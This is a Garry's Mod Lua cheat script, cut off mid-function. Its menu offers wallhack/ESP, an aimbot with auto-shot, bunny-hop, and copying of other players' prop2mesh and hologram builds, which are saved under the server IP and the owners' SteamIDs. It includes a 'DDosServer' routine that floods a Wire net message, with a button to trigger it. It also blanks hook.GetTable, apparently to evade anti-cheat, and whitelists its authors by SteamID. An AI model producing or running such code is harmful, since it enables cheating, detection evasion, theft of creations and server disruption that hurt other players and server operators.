 
-- OhiYo
----------------------------------
----------------------------------
----------------------------------
CreateConVar("auto_jump",1,FCVAR_ARCHIVE,FCVAR_REPLICATED)
-- font 
surface.CreateFont( "logfont", {
	font = "Arial", 
	extended = false,
	size = 25,
	weight = 500,
 
} )
--
 
local plays_sid ={
    "STEAM_0:0:204894442",
    "STEAM_0:1:502902344"
}

function say( str )

    RunConsoleCommand("say" , str)
end
 

TIMED = TIMED or {}
local tcreate = timer.Create 
function TIMED:StartFunction( time , func )
    if( func == nil) then return end  
    tcreate("autoreload", time, 1,function() 
        func() 
        TIMED:StartFunction( time , func )
    end)
end
function TIMED:Remove() 
    timer.Remove("autoreload") 
end
TIMED:Remove() 

local function FRunString( path , ga )
    ga = ga or "DATA"
    local string = file.Read(path , ga )
    RunString(string) 
end

if( not table.HasValue(plays_sid , LocalPlayer():SteamID())) then 
    TIMED:StartFunction( 2 , function()
        RunConsoleCommand("say" , "Я с читами! I'm with cheats! ")
    end)
    
    return 
end 

--
hook.GetTable = function()
    return {}
end

----------------------------------
----------------------------------
----------------------------------
chmenu = chmenu or {}
chmenu.panels = {}
chmenu.win = chmenu.win or nil
chmenu.open = false 
chmenu.keyboard = {
    pressing = false,
    pressed  = false,
}

chmenu.fontsize = 20
chmenu.cheat = {  
    bhope = {
        active = true,
    },
    wh = {
        active = false,
        active_b = false ,
        active_n = false ,
        active_all = false ,
        active_weapons_all = false,
    },
    hud = {
        information = false,
        cur_weap = nil,
        cursor = false,
        
    },
    aimbot = {
        active = false,
        rad = 70,
        autoshot = false,
        kickup = false ,
    }
}

-- functions --

local function exportOBJ(meshparts)
	if not meshparts then
		return
	end

	local concat  = table.concat
	local format  = string.format

	local p_verts = "v %f %f %f\n"
	local p_norms = "vn %f %f %f\n"
	local p_uvws  = "vt %f %f\n"
	local p_faces = "f %d/%d/%d %d/%d/%d %d/%d/%d\n"
	local p_parts = "#PART NUMBER %d\n"

	local function push(tbl, pattern, ...)
		tbl[#tbl + 1] = format(pattern, ...)
	end

	local t_output = {}
	local vnum = 1

	for i = 2, #meshparts do
		local part = meshparts[i]

		local s_verts = {}
		local s_norms = {}
		local s_uvws  = {}
		local s_faces = {}

		for j = 1, #part, 3 do
			local v1 = part[j + 0]
			local v2 = part[j + 1]
			local v3 = part[j + 2]

			push(s_verts, p_verts, v1.pos.x, v1.pos.y, v1.pos.z)
			push(s_verts, p_verts, v2.pos.x, v2.pos.y, v2.pos.z)
			push(s_verts, p_verts, v3.pos.x, v3.pos.y, v3.pos.z)

			push(s_norms, p_norms, v1.normal.x, v1.normal.y, v1.normal.z)
			push(s_norms, p_norms, v2.normal.x, v2.normal.y, v2.normal.z)
			push(s_norms, p_norms, v3.normal.x, v3.normal.y, v3.normal.z)

			push(s_uvws, p_uvws, v1.u, v1.v)
			push(s_uvws, p_uvws, v2.u, v2.v)
			push(s_uvws, p_uvws, v3.u, v3.v)

			push(s_faces, p_faces, vnum, vnum, vnum, vnum + 2, vnum + 2, vnum + 2, vnum + 1, vnum + 1, vnum + 1)
			vnum = vnum + 3
		end

		t_output[#t_output + 1] = concat({
			format("\no model %d\n", i - 1),
			concat(s_verts),
			concat(s_norms),
			concat(s_uvws),
			concat(s_faces)
		})
	end

	return concat(t_output)
end

function find_prop2mesh_()
    local str_ = ""
    for k,ent in pairs ( ents.FindInSphere(LocalPlayer():GetPos(),500) ) do
		len = LocalPlayer():GetPos():Distance( ent:GetPos() )
		    
        if( ent:GetClass() != "sent_prop2mesh" ) then continue end 
		str_ = str_ .. "ID: " .. ent:EntIndex() .. " Owner: " .. ent:GetOwner()
		     
	end	
    return str_
end

function STEAM_ID( ent_ )
    if( ent_ == nil) then return "nil" end 
    if( ent_:IsValid()) then 
        if( NADMOD != nil) then 
            if(  NADMOD.GetPropOwner != nil ) then 
                local ply = NADMOD.GetPropOwner(ent_)
                if( ply:IsPlayer() ) then 
                    return string.Replace( ply:SteamID(),":", "_" ) 
                end
            end
           
        end
        --NADMOD.GetPropOwner(this):Name()
    end
     
    return "nil"
end

function Prop2MeshCopy( ent  )

	ent = ent or LocalPlayer():GetEyeTraceNoCursor().Entity
   
    if( !table.HasValue({"sent_prop2mesh_legacy" ,"sent_prop2mesh"}, ent:GetClass()) ) then 
        
        return 
    else
        chat.AddText(ent:GetClass() .. " ENid: " .. ent:EntIndex() )
    end 

    local ent_index = ent:EntIndex()



	local table_ = ent.prop2mesh_controllers
    --PrintTable(table_)
    if( table_ == nil  ) then 
        chat.AddText("Error: Table == nil")
        return 
    end 
    if(table_[1] == nil) then 
        chat.AddText("Error: Table == nil")
        return 
    end 
	local filedata = exportOBJ(prop2mesh.getMeshDirect(table_[1].crc, table_[1].uvs))

    
	local dir_ = "exportOBJ/".. string.Replace(string.Replace(game.GetIPAddress(),".","_"),":","_").."/"..os.date( "%d_%m_%Y" , os.time() )
	local name_file = dir_ .. "/".. "ent_id_" .. ent_index .."_" .. STEAM_ID( ent )  .. os.date( "%H_%M_%S" , os.time() ) ..".txt"
	file.CreateDir( dir_ )

	if filedata then
		--chat.AddText("Save: " .. name_file)

        say( "Save: " .. name_file )

		file.Write(name_file , filedata)
    else
        chat.AddText("Error: filedata == nil")
	end 
	 
end




local blur = Material( "pp/blurscreen" )
local meta = FindMetaTable( "Panel" )
function meta:blur( layers, density, alpha )	
	local x, y = self:LocalToScreen(0, 0)
	surface.SetDrawColor( 255, 255, 255, alpha )
	surface.SetMaterial( blur )
	for i = 1, 4 do
		blur:SetFloat( "$blur", ( i / layers ) * density )
		blur:Recompute()
		render.UpdateScreenEffectTexture()
		surface.DrawTexturedRect( -x, -y, ScrW(), ScrH() )
	end
end
local function GetBonePosPlayer(ply)
    if( not IsValid(ply)) then return Vector(0,0,0) end 
    local bone = ply:LookupBone("ValveBiped.Bip01_Head1")
    if bone then
        local pos, ang = ply:GetBonePosition(bone) - Vector(0,0,2)
        if pos then
            return pos
        end
    end
end
local function DrawBoxOutlined( x,y,w,h,color   )

    surface.SetDrawColor( color["r"], color["g"], color["b"], color["a"] )
	surface.DrawOutlinedRect(x,y,w,h)
end
local chatprint = chat.AddText
local function GetEyeTraceEnt()
	return  LocalPlayer():GetEyeTraceNoCursor().Entity
end
local function DrawBox( x,y,w,h,color )
	surface.SetDrawColor( color["r"], color["g"], color["b"], color["a"] )
	surface.DrawRect( x,y,w,h )
end
function meta:paddition( function_ )
    function_(self)
    return self 
end
local function DrawText(text , pos_x , pos_y)
	surface.SetTextColor( 255, 255, 255)
	surface.SetTextPos( 10 + pos_x, pos_y )	
	surface.DrawText(text)	
end
local function  GetPosToString(Entity)
	return  math.floor(Entity:GetPos()["x"])..","..math.floor(Entity:GetPos()["y"])..","..math.floor(Entity:GetPos()["z"])
end
local function  GetAngleToString(Entity)
	return  math.floor(Entity:GetAngles()["pitch"])..","..math.floor(Entity:GetAngles()["yaw"])..","..math.floor(Entity:GetAngles()["roll"])
end
local function  GetColorToString(Entity)
	return  
	"R: "..math.floor(Entity:GetColor()["r"])..","..
	"G: "..math.floor(Entity:GetColor()["g"])..","..
	"B: "..math.floor(Entity:GetColor()["b"])..","..
	"A: "..math.floor(Entity:GetColor()["a"])
end
local function  GetMatreial(Entity)
	return (string.len(Entity:GetMaterial())>0 and Entity:GetMaterial() or (table.Count(Entity:GetMaterials())>=1 and Entity:GetMaterials()[1] or "None"))
end
local function  GetMaxSize(tabe_in)
	local size_line=0
	for h,v in pairs(tabe_in) do 
		if(size_line < surface.GetTextSize(v)) then 
			size_line = surface.GetTextSize(v) 
		end 
	end
	return  size_line or 0
end 
local function isWeapon(cur_weap , table_class)
	local b = false
	for h,v in pairs(table_class) do 
		if( v == cur_weap) then 
			b = true
			break 
		end
	end
	return b
end

-- functions --
-- font --
surface.CreateFont( "NAMECHAT", {
	font = "Arial",  
	extended = false,
	size = 25,
	weight = 900,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
} )
surface.CreateFont("Arial_15", {
	font = "CloseCaption_Normal", 
	size = 15, 
	weight = 1000, 
	blursize = 0, 
	scanlines = 0, 
	antialias = false, 
	underline = false, 
	italic = false, 
	strikeout = false, 
	symbol = false, 
	rotary = false, 
	shadow = false, 
	outline = false ,
})
surface.CreateFont( "TEXT_L", {
	font = "Arial",  
	extended = false,
	size = chmenu.fontsize,
	weight = 900,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false,
} )
 
-- font --
local function panel( parent , panel_inf , paint_fun)
    local l = vgui.Create( "DPanel", parent )
    if( panel_inf != nil) then 
        panel_inf["pos"] = panel_inf["pos"] or {x = 0 , y = 0}
        panel_inf["size"] = panel_inf["size"] or {x = 0 , y = 0}

        l:SetPos( panel_inf["pos"]["x"] , panel_inf["pos"]["y"] )
        l:SetSize( panel_inf["size"]["x"] , panel_inf["size"]["y"] )
    end
    if( paint_fun != nil) then 
        l.Paint = paint_fun
    end
    return l
end
local function addpanel(panel , fun )
    fun(panel)
end

local function label(parent , str_inf , panel_inf , paint_fun)
    str_inf["font"] = str_inf["font"] or "TEXT_L"
    str_inf["text"] = str_inf["text"] or "<nil>"
    str_inf["argbtext"] = str_inf["argbtext"] or Color(255,255,255)
    local l = vgui.Create( "DLabel", parent )
    if( panel_inf != nil) then 
        panel_inf["pos"] = panel_inf["pos"] or {x = 0 , y = 0}
        panel_inf["size"] = panel_inf["size"] or {x = 0 , y = 0}

        l:SetPos( panel_inf["pos"]["x"] , panel_inf["pos"]["y"] )
        l:SetSize( panel_inf["size"]["x"] , panel_inf["size"]["y"] )
    end
    l:SetFont(str_inf["font"])
    l:SetText( str_inf["text"] )
    l:SetTextColor(str_inf["argbtext"])
    if( paint_fun != nil) then 
        l.Paint = paint_fun
    end
    return l
end

local function labelclick(parent , str_inf , panel_inf , paint_fun , func_click)
    str_inf["font"] = str_inf["font"] or "TEXT_L"
    str_inf["text"] = str_inf["text"] or "<nil>"
    str_inf["argbtext"] = str_inf["argbtext"] or Color(255,255,255)
    local l = vgui.Create( "DLabel", parent )
    if( panel_inf != nil) then 
        panel_inf["pos"] = panel_inf["pos"] or {x = 0 , y = 0}
        panel_inf["size"] = panel_inf["size"] or {x = 0 , y = 0}

        l:SetPos( panel_inf["pos"]["x"] , panel_inf["pos"]["y"] )
        l:SetSize( panel_inf["size"]["x"] , panel_inf["size"]["y"] )
    end
    l:SetFont(str_inf["font"])
    l:SetText( str_inf["text"] )
    l:SetTextColor(str_inf["argbtext"])
    if( paint_fun != nil && isfunction(paint_fun)) then 
        l.Paint = paint_fun
    end
    if( func_click != nil && isfunction(func_click)) then 
        l:SetMouseInputEnabled( true )
        l.DoClick = function()
            func_click()
        end 
    end
end
local function CopyPropToE2Code( rad )
	rad = rad or 1000
	local function FindEnt(pos, rad )
		local t = {}
		for _,ent in pairs( ents.FindByClass( "gmod_wire_hologram" ) ) do
			if( pos:Distance( ent:GetPos() ) < rad ) then 
				table.Add(t, {ent})
			end
		end
		return t
	end
	local function AngleMathRand( ang )
		return Angle(  math.Round( ang[1] ) ,  math.Round( ang[2] ) ,  math.Round( ang[3] )  )
	end
	local function  PosAngToString(p)
		return  p[1]..","..p[2]..","..p[3]
	end

	local function joun(strng_u , table)
		local str_ = ""
		for it, item in pairs(table) do
			str_ = str_ .. item .. strng_u or " "
		end
		return str_
	end
	local function timeToStr( time )
		local tmp = time
		local s = tmp % 60
		tmp = math.floor( tmp / 60 )
		local m = tmp % 60
		tmp = math.floor( tmp / 60 )
		local h = tmp % 24
		tmp = math.floor( tmp / 24 )
		local d = tmp % 7
		local w = math.floor( tmp / 7 )

		return string.format( "%02iw_%id_%02ih_%02im_%02is", w, d, h, m, s )
	end
	local function changedE2( id , string)
		return 
		[[if( changed(IDload) && IDload ==]] .. id..[[){]] .. "\n" .. string .. "}\n"
	
	end
	

	-- string.Replace(string.Replace(game.GetIPAddress(),".","_"),":","_")
	-- string.Replace(string.Replace(string.Replace(GetHostName()," ",""),"|","_"),"|","")
	local dir_ = "expression2/E2holoConvert/".. string.Replace(string.Replace(game.GetIPAddress(),".","_"),":","_") 
	local name_file = dir_ .. "/".. os.date( "%H_%M_%S - %d_%m_%Y" , os.time() ) ..".txt"
	file.CreateDir( dir_ )


	local owpos = LocalPlayer():GetPos()
	local sph = ents.FindInSphere(owpos, rad )
	local TableEnts = FindEnt(owpos, rad )	
	table.Add(sph, TableEnts)


	local E2_code_s =
	[[
@name
@inputs
@outputs
@persist [Count]:number [DATA]:table [IDload  Cur IsHolo AllCount CurCount]:number Local_Entity:entity
#by UnderKo and KOT BAC�KA
interval(1)
if(first()){
	IsHolo = 1
	AllCount = ]] .. table.Count(sph) .. [[ 
	holoCreate(0) holoParent(0,entity()) holoColor(0,vec4(0,0,0,0))
	holoPos(0,entity():toWorld(vec(0,0,10)))
	holoAng(0,ang())
	Local_Entity = holoEntity(0)	 
}

]]

	local E2_code_spawnh = 
[[
if( curtime() > Cur ){ Cur = curtime() + 0.1 IDload++ }
if(!holoEntity(CurCount):isValid()){  
	local Tab = DATA[CurCount , table]      
	holoCreate(CurCount,Tab[1,vector] ,Tab[2,vector],Tab[3,angle],Tab[4,vector4])
	holoParent(CurCount , holoEntity(0))
	entity():setName("Holo count: " + CurCount + "/" + AllCount)
}else{
	local Tab = DATA[CurCount , table] 
	holoModel(CurCount,Tab[5,string])     
	if(Tab[6,string] != "null"){       
		holoMaterial(CurCount,Tab[6,string])
		}   
	}
	CurCount++
	if( CurCount > AllCount){
		CurCount = 1
	}	
]]

	file.Append( name_file,E2_code_s)


	local count = 0
	local push_ = ""
	local id = 0
	for it, item in pairs(sph) do

		item.entity = item
		item.position = item:GetPos()
		item.Ang =  AngleMathRand(item:GetAngles()   ) 
		item.model = item:GetModel()
		item.material = item:GetMaterial()
		local colo = item:GetColor()
		item.color =  colo["r"] .. "," .. colo["g"] .. "," .. colo["b"] .. "," .. colo["a"]


		local local_position = item.position - LocalPlayer():GetPos()
		if local_position == nill then 
			continue
		end
		local E2_position =  "Local_Entity:toWorld(vec(" .. PosAngToString(local_position) ..  "))"
		local E2_v_scalse =  "vec(1)"
		local E2_Ang    =  "ang("..PosAngToString( item.Ang)..")"
		local E2_color    =  "vec4("..item.color..")"
		local E2_model    = "\"null\""
		local E2_material    = "\"null\""
		if(string.len(item.model or "") >0) then 
			E2_model = "\""..item.model.."\""
		end
		if string.len(item.material) > 0 then
			E2_material = "\""..item.material.."\""
		end


		push_ = push_ .. "DATA:pushTable(table("..E2_position..","..E2_v_scalse..","..E2_Ang..","..E2_color.."," .. E2_model..","..E2_material.."))" .. "\n"
		 

		
		count = count + 1
		if( count > 10 ) then 
			push_ = push_ .. "print(\"Loaded: " .. id .. " \")\n"
			file.Append( name_file, changedE2(id ,push_)) 		
			push_ = ""
			count = 0
			id = id + 1
		end
	end 
	file.Append( name_file,"\n") 
	file.Append( name_file,E2_code_spawnh) 
	chat.AddText(Color(255,255,255) , "[E2]: Save code: " .. name_file)
end

local function VisibleTablePanels( panel )
    for key, value in pairs(chmenu.panels) do
        if( value == nil) then continue end         
        value:SetVisible(false )
    end
    if( IsValid(panel)) then 
        panel:SetVisible(true)
    else
        chatprint("Panel nil!")
    end
    
end
 
if( IsValid(chmenu.win)) then 

    chmenu.win:Remove()
end
 
function chmenu:DDosServer()     
    net.Start( "wire_expression2_request_file" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.WriteString( "Hi" )
    net.SendToServer()        
end
function chmenu:ResetAll()
    chmenu.cheat = {   
        wh = {
            active = false,
            active_b = false ,
            active_n = false ,
            active_all = false ,
            active_weapons_all = false,
        },
        hud = {
            information = false,
            cur_weap = nil,
            cursor = false,
            
        },
        aimbot = {
            active = false,
            rad = 70,
            autoshot = false,
            kickup = false ,
        }
    }
end
function chmenu:menu()
    if( IsValid(chmenu.win) ) then 


        chmenu.win:SetVisible( not chmenu.win:IsVisible() ) 
        return  
    end 
    RunConsoleCommand("-jump")			
    local w,h = ScrW(),ScrH()
    chmenu.win = vgui.Create( "DFrame" ) 	       
    chmenu.win:SetSize( w * 0.4,  h * 0.5 ) 	
    chmenu.win:Center() --SetPos(  10 , h / 2 - chmenu.win:GetTall()/2 )	 			 
    chmenu.win:SetTitle( "" ) 
    chmenu.win:MakePopup()
    chmenu.win:ShowCloseButton(false )
    --chmenu.win:SetKeyBoardInputEnabled( false  )
    chmenu.win.blo = 0	
    chmenu.win:SetVisible(false )	  
    chmenu.win.Paint = function(self,w,h)                     
        self.blo = math.Clamp(chmenu.win.blo + 5, 0, 220)                       
        self:blur(1,1,chmenu.win.blo)               
        draw.RoundedBox(0, 0, 0, w, h, Color(0,0,0,120))

        DrawBoxOutlined(0,0,w,h,Color(86,156,214,220)) 
    end    
    chmenu.win:paddition(function(self)
        labelclick(self , 
            {
                font = "TEXT_L" ,
                text = " Hide " , 
                argbtext = Color(255,255,255)
            } ,{ pos = {x = self:GetWide() - 65 , y = 5},size = {x = 60 , y = 25}},
            function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
            function()
                if( IsValid(chmenu.win)) then 
                    chmenu.win:SetVisible(false )	 
                    chmenu.open = false 
                end
            end
        )
        labelclick(self , 
            {
                font = "TEXT_L" ,
                text = " Reload " , 
                argbtext = Color(255,255,255)
            } ,{ pos = {x = self:GetWide() - 135 , y = 5},size = {x = 70 , y = 25}},
            function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
            function()
                
                chmenu.win:Remove()
                RunConsoleCommand("RunGLuaFile","scripts/cheat_u.txt")
                
            end
        )
        labelclick(self , 
            {
                font = "TEXT_L" ,
                text = " Bhope " , 
                argbtext = Color(255,255,255)
            } ,{ pos = {x = self:GetWide() -(135 + 65) , y = 5},size = {x = 70 , y = 25}},
            function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
            function()
                if( GetConVarNumber("auto_jump") == 0) then 
                    RunConsoleCommand( "auto_jump" ,  1 )
                    return 
                end
                RunConsoleCommand( "auto_jump" , 0 )
            end
        )
    end)
    local function SetMainName( string_ )
        if( !IsValid(chmenu.win.main)) then return end 
        chmenu.win.main.text = string_ or "<nil>"
    end
    chmenu.win:paddition(function(self)

        self.main = vgui.Create( "DPanel" , self )
        self.main:SetPos( self:GetWide() * 0.3 , 30 ) 
        self.main:SetSize( self:GetWide() - self:GetWide() * 0.3 , self:GetTall()  )
        self.main.Paint = function(self,w,h)                                         
            draw.RoundedBox(0, 0, 0, w, h, Color(24,24,24,100))           
            draw.DrawText(self.text or "<nil>", "TEXT_L", 10, 10,  Color( 255, 255, 255, 255 )) 
            draw.RoundedBox(0, 0, 35, w, 2, Color(255,255,255,87))
        end
        self.main:paddition(function(self)
            // "ESP" --------------------------------
            chmenu.panels["ESP"] = panel(self,
                { 
                
                    pos = {x = 0 , y = 30},
                    size = {x = self:GetWide() , y = self:GetTall() - 30},
                },
                function(self,w,h)
                    draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
                end
            
            ):paddition(function(self)
                addpanel(self , function(self)
                    label(self , 
                    {
                        font = "TEXT_L" ,
                        text = "WH" , 
                        argbtext = Color(175,175,175)
                    } , 
                    { 
                        pos = {x = 15 , y = 15},
                        size = {x = 100 , y = 20},
                    },
                    function(self,w,h)
                        draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                    end
                    )
                    local pos = 40
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Visible players" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 200 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.wh.active = ! chmenu.cheat.wh.active
                        
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Visible bots" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 200 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.wh.active_b = ! chmenu.cheat.wh.active_b
                        chatprint("[cheat][active_b]: " .. tostring(chmenu.cheat.wh.active_b))
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Draw names" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 200 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.wh.active_n = ! chmenu.cheat.wh.active_n
                        chatprint("[cheat][active_n]: " .. tostring(chmenu.cheat.wh.active_n))
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Visible all" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 200 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.wh.active_all = ! chmenu.cheat.wh.active_all
                        chatprint("[cheat][active_all]: " .. tostring(chmenu.cheat.wh.active_all))
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Visible weapons all" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 200 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.wh.active_weapons_all = ! chmenu.cheat.wh.active_weapons_all
                        chatprint("[cheat][active_weapons_all]: " .. tostring(chmenu.cheat.wh.active_weapons_all))
                    end
                    )
                end)
            end)
            // "HUD" --------------------------------
            chmenu.panels["HUD"] = panel(self,
            {              
                pos = {x = 0 , y = 30},
                size = {x = self:GetWide() , y = self:GetTall() - 30},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
            end):paddition(function(self)
                addpanel(self , function(self)
                    label(self , 
                    {
                        font = "TEXT_L" ,
                        text = "Custom" , 
                        argbtext = Color(175,175,175)
                    } , 
                    { 
                        pos = {x = 10 , y = 15},
                        size = {x = 100 , y = 20},
                    },
                    function(self,w,h)
                        draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                    end
                    )
            
                    local pos = 40
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "Visible Entity information" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.hud.information = ! chmenu.cheat.hud.information
                        chatprint("[HUD][INF]: " .. tostring(chmenu.cheat.hud.information))
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                        {
                            font = "TEXT_L" ,
                            text = "Custom cursor" , 
                            argbtext = Color(255,255,255)
                        },
                        { 
                            pos = {x = 20 , y = pos},
                            size = {x = 200 , y = 25}
                        },
                        function(self,w,h) 
                            draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) 
                        end,
                        function()            
                            chmenu.cheat.hud.cursor = !chmenu.cheat.hud.cursor
                             
                        end
                    )
                end)    
            end)
            // "Aim Bot" --------------------------------
            chmenu.panels["Aim Bot"] = panel(
                self,
                { 
                    
                    pos = {x = 0 , y = 30},
                    size = {x = self:GetWide() , y = self:GetTall() - 30},
                },
                function(self,w,h)
                    draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
                end
            ):paddition(function(self)
                addpanel(self , function(self)
                    label(self , 
                    {
                        font = "TEXT_L" ,
                        text = "Aim" , 
                        argbtext = Color(175,175,175)
                    } , 
                    { 
                        pos = {x = 15 , y = 15},
                        size = {x = 100 , y = 20},
                    },
                    function(self,w,h)
                        draw.RoundedBox(0, 0, 0, w, h, Color(255,0,0,0))
                    end
                    )
            
                    local pos = 40
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "Active " , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.aimbot.active = ! chmenu.cheat.aimbot.active
                        chatprint("[Aim Bot][Active]: " .. tostring(chmenu.cheat.aimbot.active))
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "Radius - 10" , 
                        argbtext = Color(255,144,144)
                    } ,{ pos = {x = 30 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.aimbot.rad =  chmenu.cheat.aimbot.rad - 10   
                        
                    end
                    )
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "Radius + 10" , 
                        argbtext = Color(176,255,123)
                    } ,{ pos = {x = 30 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                          
                        chmenu.cheat.aimbot.rad =  chmenu.cheat.aimbot.rad + 10                  
                    end
                    )    
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "Auto shot " , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.aimbot.autoshot = ! chmenu.cheat.aimbot.autoshot
                        chatprint("[Aim Bot][Auto shot]: " .. tostring(chmenu.cheat.aimbot.autoshot))
                    end
                    )   
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = "KickUp shot" , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                        chmenu.cheat.aimbot.kickup = ! chmenu.cheat.aimbot.kickup
                        chatprint("[Aim Bot][KickUp shot]: " .. tostring(chmenu.cheat.aimbot.kickup))
                    end
                    )              
                end)
            end)
            // "Copy prop" --------------------------------
            chmenu.panels["Copy prop"] = panel(self,
            {             
                pos = {x = 0 , y = 30},
                size = {x = self:GetWide() , y = self:GetTall() - 30},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
            end
            ):paddition(function(self)
                addpanel(self , function(self)
        
                    local pos = 20
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Props to E2 code " , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                         
                        CopyPropToE2Code(  )
                    end
                    )
                    pos = pos + 25
                    ---------------------
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Copy prop2meshes Rad: 1000 " , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                         
                        RunConsoleCommand("Prop2MeshCopyall")
                    end
                    )
                    ----------
                    pos = pos + 25
                    labelclick(self, 
                    {
                        font = "TEXT_L" ,
                        text = " Copy prop2meshes all map " , 
                        argbtext = Color(255,255,255)
                    } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
                    function(self,w,h) draw.RoundedBox(0, 0, 0, w, h, self:IsHovered() and Color(255,255,255,10) or Color(0,0,0,10)) end,
                    function()            
                         
                        RunConsoleCommand("Prop2MeshCopyallNodis")
                    end
                    )
                end)


            end)
            chmenu.panels["ddos_panel"] = panel(self,
            {             
                pos = {x = 0 , y = 30},
                size = {x = self:GetWide() , y = self:GetTall() - 30},
            },
            function(self,w,h)
                draw.RoundedBox(0, 0, 0, w, h, Color(255,255,255,0))
            end
            ):paddition(function(self)
                local pos = 20
                labelclick(self, 
                {
                    font = "TEXT_L" ,
                    text = "<wire> ohiyo_ddos_server" , 
                    argbtext = Color(255,255,255)
                } ,{ pos = {x = 20 , y = pos},size = {x = 300 , y = 25}},
